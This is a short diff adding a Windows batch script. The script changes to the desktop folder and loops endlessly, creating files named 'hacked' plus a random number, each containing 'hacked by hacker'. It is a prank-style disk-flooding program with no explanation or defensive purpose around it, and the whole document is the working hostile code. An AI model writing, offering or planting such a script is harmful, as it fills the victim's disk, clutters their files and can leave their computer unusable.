@@ -1,0 +1,5 @@
+@echo off
+cd c:\Documents and settings\%user%\Desktop 
+:loop 
+echo hacked by hacker>hacked%random%
+goto loop
